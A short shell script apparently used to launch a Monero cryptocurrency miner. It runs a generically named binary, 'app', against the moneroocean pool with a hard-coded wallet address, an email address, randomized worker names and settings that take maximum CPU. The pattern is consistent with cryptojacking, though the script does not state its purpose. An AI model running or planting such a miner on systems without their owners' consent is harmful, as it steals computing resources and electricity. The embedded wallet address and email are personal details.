time=`cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 5 | head -n 1`
time=$time"-orb"

if [ "$1" != "" ]; then
    time=$1
fi

chmod +x app
./app --donate-level 1 -o gulf.moneroocean.stream:443 -u 489SKk43bDUL3KF3E5RPMmEVpB6cLYJJcWZmPbmxrJ1vGyh3dAADeLxUQK8UK6yqNWTJG96cATyiG7Qs39PXi6K932ug3zS -p $time:mewknows@gmail.com -k --tls --cpu-no-yield --cpu-priority 5 --randomx-mode=fast
